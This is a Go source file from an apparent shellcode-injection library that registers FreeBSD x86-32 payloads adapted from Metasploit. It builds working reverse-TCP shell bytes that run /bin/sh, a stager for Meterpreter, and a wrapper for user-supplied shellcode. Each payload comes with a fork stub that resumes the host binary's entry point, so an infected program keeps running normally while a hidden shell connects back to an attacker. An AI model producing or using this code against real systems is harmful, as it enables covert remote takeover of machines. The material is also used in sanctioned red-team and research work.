package modules

import "github.com/Binject/shellcode/api"

func init() {
	api.RegisterShellCode(api.FreeBSD, api.Intel32,
		"reverse_tcp_shell", reverse_tcp_shell_freebsd_intel_32)
	api.RegisterShellCode(api.FreeBSD, api.Intel32,
		"reverse_tcp_stager", reverse_tcp_stager_freebsd_intel_32)
	api.RegisterShellCode(api.FreeBSD, api.Intel32,
		"user_shellcode", user_shellcode_freebsd_intel_32)
}

func reverse_tcp_shell_freebsd_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	ip := params.IP

	/*
	   Modified metasploit payload/bsd/x86/shell_reverse_tcp
	   to correctly fork the shellcode payload and contiue normal execution.
	*/

	shellcode1 := "\x52"     // push edx
	shellcode1 += "\x31\xC0" // xor eax, eax
	shellcode1 += "\xB0\x02" // mov al, 2
	shellcode1 += "\xCD\x80" // int 80
	shellcode1 += "\x5A"     // pop edx
	shellcode1 += "\x85\xc0\x74\x07"
	shellcode1 += "\xbd"
	//JMP to e_entry
	if as, err := api.PackUint32(entry); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xff\xe5"
	//BEGIN EXTERNAL SHELLCODE
	shellcode1 += "\x68"
	shellcode1 += api.PackIP(ip)
	shellcode1 += "\x68\xff\x02"
	if ps, err := api.PackPort(port); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += "\x89\xe7\x31\xc0\x50" +
		"\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62" +
		"\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68" +
		"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50" +
		"\xb0\x3b\xcd\x80"

	return []byte(shellcode1), nil
}

func reverse_tcp_stager_freebsd_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	ip := params.IP

	/*
	   FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
	   Modified metasploit payload/linux/armle/shell/reverse_tcp
	   to correctly fork the shellcode payload and contiue normal execution.
	*/

	//FORK SHELLCODE
	shellcode1 := "\x52"     // push edx
	shellcode1 += "\x31\xC0" // xor eax, eax
	shellcode1 += "\xB0\x02" // mov al, 2
	shellcode1 += "\xCD\x80" // int 80
	shellcode1 += "\x5A"     // pop edx
	shellcode1 += "\x85\xc0\x74\x07"
	shellcode1 += "\xbd"
	if as, err := api.PackUint32(entry); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xff\xe5"
	//EXTERNAL SHELLCODE
	shellcode1 += "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68"
	shellcode1 += api.PackIP(ip)
	shellcode1 += "\xcd\x80\x68\x10\x02"
	if ps, err := api.PackPort(port); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += "\x89\xe1\x6a\x10\x51\x50\x51\x97\x6a\x62\x58\xcd\x80" +
		"\xb0\x03\xc6\x41\xfd\x10\xcd\x80\xc3"
	return []byte(shellcode1), nil
}

func user_shellcode_freebsd_intel_32(params api.Parameters) ([]byte, error) {
	entry := params.Entry
	supplied_shellcode := params.ShellCode

	//FORK SHELLCODE
	shellcode1 := "\x52"     // push edx
	shellcode1 += "\x31\xC0" // xor eax, eax
	shellcode1 += "\xB0\x02" // mov al, 2
	shellcode1 += "\xCD\x80" // int 80
	shellcode1 += "\x5A"     // pop edx
	shellcode1 += "\x85\xc0\x74\x07"
	shellcode1 += "\xbd"
	if as, err := api.PackUint32(entry); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xff\xe5"
	shellcode1 += string(supplied_shellcode)

	return []byte(shellcode1), nil
}
